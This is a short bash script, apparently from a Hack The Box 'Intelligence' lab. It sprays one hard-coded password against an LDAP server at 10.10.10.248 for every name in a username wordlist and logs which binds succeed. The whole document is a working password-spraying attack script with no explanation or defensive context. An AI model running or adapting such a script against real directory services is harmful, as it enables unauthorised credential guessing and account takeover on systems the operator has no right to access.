#!/bin/bash

while read u; do
    VALID=$(ldapsearch -x -h 10.10.10.248 -D "intelligence.htb\\$u" -w "NewIntelligenceCorpUser9876" -b "DC=intelligence,DC=com" 2>&1 | grep -ia 'valid')
    echo "${u} ${VALID}" >> bruteforce.log
done < wordlists/usernames
